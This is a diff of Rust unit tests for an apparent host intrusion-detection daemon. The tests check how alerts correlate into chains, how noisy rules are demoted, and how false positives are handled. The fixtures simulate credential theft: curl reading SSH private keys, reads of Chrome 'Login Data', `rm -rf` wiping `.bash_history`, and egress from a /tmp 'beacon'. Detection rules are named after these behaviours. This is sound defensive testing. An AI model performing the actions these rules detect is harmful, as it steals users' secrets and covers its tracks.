+            f.meta.family = family.into();
+            f.meta.severity = severity.into();
+            f.hook = "file_post_open".into();
+            f.hook_detail = Some("read".into());
+            f.ancestry = vec![makepkg.clone()];
+            f.file = Some(crate::alert::FileRef { path, sha256: None });
+            f
+        };
+
+        // Flood the exec rule across enough distinct shapes that the guard
+        // gives up on the rule as a whole -- what a week of `cargo test` does.
+        // The names are plain lowercase so `collapse_volatile` leaves them as
+        // five separate patterns instead of folding them into one.
+        d.baseline.noisy_rule_per_day = 2;
+        for dirname in ["alpha", "bravo", "charlie", "delta", "echo", "foxtrot"] {
+            for _ in 0..4 {
+                let _ = d.emit(finding(
+                    "moat-exec-untrusted-tmpfs",
+                    "exec",
+                    "high",
+                    format!("/tmp/{}/bin/tool", dirname),
+                ));
+            }
+        }
+        assert!(
+            d.baseline.is_demoted("moat-exec-untrusted-tmpfs"),
+            "precondition: the flood demoted the rule the attack later trips"
+        );
+
+        // Now the attack: the demoted /tmp exec, and egress in the same tree.
+        let a = d
+            .emit(finding(
+                "moat-exec-untrusted-tmpfs",
+                "exec",
+                "high",
+                "/tmp/moat-aur-lab-dljiwccr/browser-helper".to_string(),
+            ))
+            .expect("a demoted rule still records an alert");
+        let b = d
+            .emit(finding(
+                "moat-x-pkg-egress",
+                "net",
+                "medium",
+                "/tmp/moat-aur-lab-dljiwccr/beacon".to_string(),
+            ))
+            .expect("the egress must raise an alert");
+
+        let alerts = d.store.load();
+        let by_id = |id: &str| alerts.iter().find(|x| x.id == id).unwrap().clone();
+        let chain = by_id(&a).chain.clone().expect("the two must correlate");
+        assert_eq!(by_id(&b).chain.as_ref().map(|c| c.id.as_str()), Some(chain.id.as_str()));
+
+        // The demoted step is a TRIGGER. This is the whole fix: a rule the
+        // guard called noisy is the prime candidate for a sequence, not a thing
+        // that can no longer speak.
+        assert!(
+            chain.steps.iter().all(|s| s.is_trigger()),
+            "a noise-guard demotion must not turn a step into context"
+        );
+        // ...so the chain sees the `high` and says so...
+        assert_eq!(crate::alert::severity_rank(&chain.severity) >= 2, true,
+                   "chain is {} with a high trigger in it", chain.severity);
+        // ...and it reaches the user, which is the part that failed live.
+        assert_eq!(by_id(&a).surface, "alerts", "a high chain has to reach the badge");
+    }
+
+    /// The counterpart: an alert the *user* allowlisted is still context, so
+    /// the fix above did not quietly turn the allowlist into a chain trigger.
+    #[test]
+    fn an_allowlisted_alert_is_still_only_context() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        std::fs::write(
+            d.cfg.paths.allowlist_dir.join("user.toml"),
+            "[[rule]]\nname = \"moat-cred-project-token-read\"\n",
+        )
+        .unwrap();
+        d.reload_allowlist();
+
+        let node = ProcInfo {
+            exec_id: "e-node".into(),
+            pid: 1_876_167,
+            uid: 1000,
+            exe: "/usr/bin/node".into(),
+            args: String::new(),
+            cwd: "/tmp/lab".into(),
+            start_time: util::now_rfc3339(),
+            parent_exec_id: None,
+            exited_at: None,
+            exit_signal: None,
+            exe_note: None,
+            sid: None,
+        };
+        let finding = |rule: &str, family: &str, severity: &str, path: &str| {
+            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), node.clone());
+            f.meta.family = family.into();
+            f.meta.severity = severity.into();
+            f.hook = "file_post_open".into();
+            f.file = Some(crate::alert::FileRef { path: path.into(), sha256: None });
+            f
+        };
+        let a = d
+            .emit(finding("moat-persist-git-config-write", "persist", "high", "/tmp/lab/.git/config"))
+            .unwrap();
+        d.emit(finding("moat-cred-project-token-read", "cred", "medium", "/tmp/lab/.env"))
+            .unwrap();
+
+        let pa = d.store.load().into_iter().find(|x| x.id == a).unwrap();
+        assert!(
+            pa.chain.is_none(),
+            "an allowlisted second family must not create a chain"
+        );
+        assert_eq!(d.status()["chains_formed"], 0);
+    }
+
+    /// The correlator must never merge two unrelated trees. Replaying the same
+    /// install under a *different* npm gives a second chain, not a bigger one.
+    #[test]
+    fn a_second_unrelated_install_is_a_second_chain() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        // The two installs replay milliseconds apart, so without this the
+        // second one folds into the first by (rule, exe, file) and never
+        // produces the alerts a second chain would be made of. The question
+        // here is about trees, not about dedupe.
+        d.cfg.thresholds.dedupe_secs = 0;
+        let text = std::fs::read_to_string(&d.cfg.paths.tetragon_log).unwrap();
+        for line in text.lines() {
+            d.handle_line(line);
+        }
+        // Same events, every exec_id and pid moved into a second install.
+        for line in text.lines() {
+            d.handle_line(&line.replace("bWFyczoxMjM0", "bWFyczo5OTk5").replace("412", "512"));
+        }
+        let chains: std::collections::HashSet<String> = d
+            .store
+            .load()
+            .into_iter()
+            .filter_map(|a| a.chain.map(|c| c.id))
+            .collect();
+        assert_eq!(chains.len(), 2, "two installs are two stories, not one");
     }
 
     /// Alert ids are the timeline, so a burst inside one millisecond must still
@@ -1896,6 +5014,104 @@ mod tests {
         assert_eq!(d.store.load().len(), n, "moatd must not alert on itself");
     }
 
+    /// The feedback loop moat built for itself. Staging an incident copies the
+    /// credential file into /var/lib/moat/incidents/<id>/file/<name>; the next
+    /// recursive search reads that copy; the read raises a fresh cred alert;
+    /// that alert stages another copy. Half of every browser-secret alert on
+    /// this machine on 2026-09-04 was this loop eating its own tail.
+    #[test]
+    fn a_read_of_moats_own_evidence_store_is_never_a_credential_alert() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, cfg) = dev_daemon(dir.path());
+        let staged = cfg
+            .paths
+            .state_dir
+            .join("incidents/01ABC/file/Login Data")
+            .to_string_lossy()
+            .into_owned();
+
+        let read = |policy: &str, path: &str| {
+            format!(
+                r#"{{"process_kprobe":{{"process":{{"exec_id":"r1","pid":9400,"uid":1000,"binary":"/usr/bin/rg","arguments":"--hidden --glob !.git","cwd":"/home/testuser","start_time":"2026-09-04T23:15:00.000000000Z"}},"function_name":"security_file_post_open","policy_name":"{}","args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":4}}]}},"time":"2026-09-04T23:15:43.100Z"}}"#,
+                policy, path
+            )
+        };
+
+        let n = d.store.load().len();
+        d.handle_line(&read("moat-cred-browser-secrets-read", &staged));
+        assert_eq!(
+            d.store.load().len(),
+            n,
+            "reading moat's own staged evidence must never raise a cred alert"
+        );
+
+        // The real file it was copied FROM is still the whole point of the rule.
+        d.handle_line(&read(
+            "moat-cred-browser-secrets-read",
+            "/home/testuser/.config/google-chrome/Default/Login Data",
+        ));
+        assert_eq!(d.store.load().len(), n + 1, "the rule still guards real browser secrets");
+
+        // And a rule whose SUBJECT is that directory keeps seeing it, or the
+        // cut above would have quietly disarmed the tamper detection.
+        let unlink = format!(
+            r#"{{"process_kprobe":{{"process":{{"exec_id":"r2","pid":9401,"uid":0,"binary":"/usr/bin/rm","arguments":"-rf","cwd":"/","start_time":"2026-09-04T23:16:00.000000000Z"}},"function_name":"security_path_unlink","policy_name":"moat-rootkit-evidence-tamper","args":[{{"path_arg":{{"path":"{}"}}}}]}},"time":"2026-09-04T23:16:00.100Z"}}"#,
+            staged
+        );
+        d.handle_line(&unlink);
+        assert_eq!(
+            d.store.load().len(),
+            n + 2,
+            "evidence-tamper must still fire on moat's own directory"
+        );
+    }
+
+    /// The kernel matches a history file by name alone (`Postfix
+    /// /.bash_history`), so it fires on that name anywhere on the filesystem.
+    /// On 2026-09-04 moat's own test suite tripped it -- `rm -rf` on a sandbox
+    /// tempdir removed the throwaway $HOME inside it -- and because the rule is
+    /// in the `rootkit` family that raised an ordinary build into a HIGH chain.
+    #[test]
+    fn a_history_file_that_is_nobodys_history_is_not_tampering() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        d.homes = vec!["/home/testuser".into()];
+        d.provenance.set_homes(&d.homes);
+        d.subvols = vec![("/@home".into(), "/home".into()), ("/@".into(), "/".into())];
+
+        let ev = |path: &str| {
+            format!(
+                r#"{{"process_kprobe":{{"process":{{"exec_id":"h1","pid":9300,"uid":1000,"binary":"/usr/bin/rm","arguments":"-rf --","cwd":"/tmp","start_time":"2026-09-04T21:25:00.000000000Z"}},"function_name":"security_path_unlink","policy_name":"moat-rootkit-history-tamper","args":[{{"path_arg":{{"path":"{}"}}}}]}},"time":"2026-09-04T21:25:00.100Z"}}"#,
+                path
+            )
+        };
+
+        // The exact event from 2026-09-04. Nobody's trail, so none was covered.
+        let n = d.store.load().len();
+        d.handle_line(&ev("/moat-sandbox-test.VBeheQGq/home/.bash_history"));
+        assert_eq!(
+            d.store.load().len(),
+            n,
+            "a .bash_history inside a scratch dir is not anyone's history"
+        );
+
+        // The same `rm` against a real account still alerts -- and the
+        // subvolume spelling the sensor actually emits must not hide it, which
+        // is the way this fix could have quietly killed the rule instead.
+        d.handle_line(&ev("/@home/testuser/.bash_history"));
+        let alerts = d.store.load();
+        assert_eq!(
+            alerts.len(),
+            n + 1,
+            "erasing a real account's history is the entire point of the rule"
+        );
+        assert_eq!(
+            alerts.last().unwrap().file.as_ref().unwrap().path,
+            "/home/testuser/.bash_history",
+            "the path shown is the one a person would recognise, not /@home/..."
+        );
+    }
+
     /// A finding at high severity captures an incident snapshot, and that
     /// snapshot sha256s the file the event named. So a fixture that names a
     /// real path makes the test suite *open that file* — and every fixture
@@ -1964,11 +5180,14 @@ mod tests {
         assert!(staged.exists(), "the suspect script sits beside the bundle");
         assert!(String::from_utf8_lossy(&std::fs::read(&staged).unwrap()).contains("atob"));
         use std::os::unix::fs::PermissionsExt;
-        assert_eq!(
-            std::fs::metadata(&staged).unwrap().permissions().mode() & 0o777,
-            0o400,
-            "staged hostile files are not executable"
-        );
+        let mode = std::fs::metadata(&staged).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o440, "staged hostile files are read-only");
+        assert_eq!(mode & 0o111, 0, "and never executable");
+        // The comment above says "so the agent can read and decode it", and the
+        // agent runs as the user while moatd runs as root -- so group-readable
+        // is not a detail, it is the difference between staging working and
+        // being an elaborate no-op.
+        assert_ne!(mode & 0o040, 0, "the group the agent is in must be able to open it");
 
         // The credential is named and explicitly withheld, and the agent is
         // told not to go and open it itself.
@@ -2096,7 +5315,7 @@ mod tests {
             .store
             .load()
             .iter()
-            .filter(|x| !x.acked && !x.is_suppressed() && x.severity == a.severity)
+            .filter(|x| !x.acked && !x.is_suppressed() && x.surface == "alerts" && x.severity == a.severity)
             .count() as u64;
         assert_eq!(d.store.unacked()[&a.severity], counted, "suppressed alerts are not counted");
         assert!(d.alerts_suppressed >= 1);
@@ -2495,9 +5714,22 @@ mod tests {
                 a.surface
             );
             assert!(!a.rarity_text.is_empty(), "{} has no rarity sentence", a.rule);
-            // BASELINE §5: only high and critical reach the Alerts tab.
+            // BASELINE §5: only high and critical reach the Alerts tab ON THEIR
+            // OWN. A member of a chain that reached `high` is the exception,
+            // and it is not a silent one -- the alert carries the `chain` that
+            // raised it, so a reader working from alerts.jsonl alone can see
+            // exactly why a `low` is on the badge.
             if a.surface == "alerts" {
-                assert!(a.severity_rank() >= 2, "{} is {} on the Alerts tab", a.rule, a.severity);
+                let raised_by_chain = a
+                    .chain
+                    .as_ref()
+                    .is_some_and(|c| crate::alert::severity_rank(&c.severity) >= 2);
+                assert!(
+                    a.severity_rank() >= 2 || raised_by_chain,
+                    "{} is {} on the Alerts tab with no chain to justify it",
+                    a.rule,
+                    a.severity
+                );
                 // ...and nothing already answered for reaches it at all. The
                 // recorded surface is the only thing a reader working from
                 // alerts.jsonl alone has (an offline audit, the setup screen),
@@ -2626,6 +5858,7 @@ mod tests {
                     exited_at: None,
                     exit_signal: None,
                     exe_note: None,
+                    sid: None,
                 },
             );
             f.meta.family = "cred".into();
@@ -2687,6 +5920,7 @@ mod tests {
                 parent: "/usr/bin/Hyprland",
                 dir: "/home/dan/.config/hypr",
                 severity: "low",
+                severity_base: "low",
                 provenance: "official",
                 package: Some("restic 0.18.1-1".into()),
                 context: "service",
@@ -2708,6 +5942,116 @@ mod tests {
         assert!(p["toml"].as_str().unwrap().contains("[[rule]]"));
     }
 
+    /// The retroactive half of a demotion is the daemon's, and it is scoped
+    /// exactly as the demotion is: the pattern's earlier alerts leave the
+    /// badge, another pattern of the same rule does not, and a step a `high`
+    /// chain re-surfaced is not silenced by a noise count.
+    #[test]
+    fn a_demotion_quietens_the_backlog_it_covers_and_nothing_else() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        d.cfg.thresholds.dedupe_secs = 0;
+        d.handle_line(&exec_line("e-hypr", 1, "/usr/bin/Hyprland", "", ""));
+        // A different pattern of the same rule, on the badge before the flood.
+        // Same actor, different directory: a different (rule, exe, parent,
+        // dir) tuple, and so a different pattern to the noise guard.
+        d.handle_line(&read_line(
+            "e-other",
+            300,
+            "/usr/bin/restic",
+            "backup",
+            "e-hypr",
+            "moat-persist-hypr-config-write",
+            "/home/dan/.config/hypr/conf.d/extra.conf",
+        ));
+        let other = d
+            .store
+            .load()
+            .into_iter()
+            .find(|a| a.file.as_ref().map_or(false, |f| f.path.contains("conf.d")))
+            .expect("the conf.d alert");
+        assert_eq!(other.surface, "alerts", "precondition: on the badge");
+
+        for i in 0..25u32 {
+            d.handle_line(&read_line(
+                &format!("e-w{}", i),
+                400 + i,
+                "/usr/bin/restic",
+                "backup",
+                "e-hypr",
+                "moat-persist-hypr-config-write",
+                &format!("/home/dan/.config/hypr/gen{}.conf", i % 4),
+            ));
+        }
+        assert!(
+            !d.baseline.is_demoted("moat-persist-hypr-config-write"),
+            "one pattern flooded, not the rule"
+        );
+        let alerts = d.store.load();
+        let flood: Vec<_> = alerts
+            .iter()
+            .filter(|a| a.file.as_ref().map_or(false, |f| f.path.contains("/hypr/gen")))
+            .collect();
+        assert!(flood.len() > 20);
+        for a in &flood {
+            assert_eq!(a.surface, "timeline", "{} raised before the demotion is quiet after it", a.id);
+        }
+        let vim = alerts.iter().find(|a| a.id == other.id).unwrap();
+        assert_eq!(vim.surface, "alerts", "the other pattern is untouched");
+
+        // What the panel counts and what the daemon counts are now the same
+        // set, with no list to consult.
+        let waiting: Vec<_> = alerts
+            .iter()
+            .filter(|a| a.rule == "moat-persist-hypr-config-write" && !a.acked && a.surface == "alerts")
+            .collect();
+        assert_eq!(waiting.len(), 1);
+        assert_eq!(waiting[0].id, vim.id);
+        // The guard's own announcement is medium, so it is on the timeline and
+        // not in this number either.
+        assert_eq!(d.store.unacked()["high"], 1);
+    }
+
+    /// `status.unacked`, the watchdog's "N alerts waiting", and the panel's
+    /// badge all answer one question. Two of them had their own filter.
+    #[test]
+    fn status_unacked_and_the_watchdog_count_the_same_thing() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        d.cfg.thresholds.dedupe_secs = 0;
+        d.handle_line(&exec_line("e-sh", 1, "/usr/bin/bash", "", ""));
+        // Two on the badge, one timelined by a triage demotion, one medium
+        // (timeline by severity), one suppressed.
+        for (i, path) in ["/home/dan/.ssh/id_ed25519", "/home/dan/.ssh/id_rsa_moat_fixture"].iter().enumerate() {
+            d.handle_line(&read_line(
+                &format!("e-k{}", i), 500 + i as u32, "/usr/bin/curl", "", "e-sh",
+                "moat-cred-ssh-private-key-read", path,
+            ));
+        }
+        d.handle_line(&read_line(
+            "e-t", 510, "/usr/bin/curl", "", "e-sh",
+            "moat-cred-ssh-private-key-read", "/home/dan/.ssh/id_ecdsa_moat_fixture",
+        ));
+        let timelined = d.store.load().into_iter().rfind(|a| a.surface == "alerts").unwrap();
+        d.mark(&timelined.id, "surface", Value::from("timeline")).unwrap();
+
+        let s = d.status();
+        let status_total: u64 = ["critical", "high", "medium", "low"]
+            .iter()
+            .map(|k| s["unacked"][k].as_u64().unwrap_or(0))
+            .sum();
+        let badge = d
+            .store
+            .load()
+            .iter()
+            .filter(|a| !a.acked && !a.is_suppressed() && a.surface == "alerts")
+            .count() as u64;
+        assert_eq!(status_total, badge, "status.unacked is the badge, not every unacked record");
+        assert!(badge >= 2, "precondition");
+        // And the record the daemon itself timelined is not "unacked" anywhere.
+        assert!(d.store.load().iter().any(|a| !a.acked && a.surface == "timeline"));
+    }
+
     /// BASELINE §4: a flooding rule is demoted, one alert explains it, and the
     /// demoted alerts stay on the timeline **without** being suppressed.
     #[test]
@@ -2727,7 +6071,13 @@ mod tests {
                 &format!("/home/dan/.config/hypr/gen{}.conf", i % 4),
             ));
         }
-        assert!(d.baseline.is_demoted("moat-persist-hypr-config-write"));
+        // One shape flooding demotes that shape, not the whole rule -- which is
+        // the point: another shape of this rule stays on the badge.
+        assert!(!d.baseline.is_demoted("moat-persist-hypr-config-write"));
+        assert!(d
+            .baseline
+            .demoted_rules()
+            .contains(&"moat-persist-hypr-config-write".to_string()));
         assert_eq!(
             d.status()["demoted_rules"].as_array().unwrap().len(),
             1,
@@ -2818,6 +6168,7 @@ mod tests {
                 parent: "",
                 dir: "/home/dan/.ssh",
                 severity: "medium",
+                severity_base: "medium",
                 provenance: "official",
                 package: Some("restic 0.18.1-1".into()),
                 context: "service",
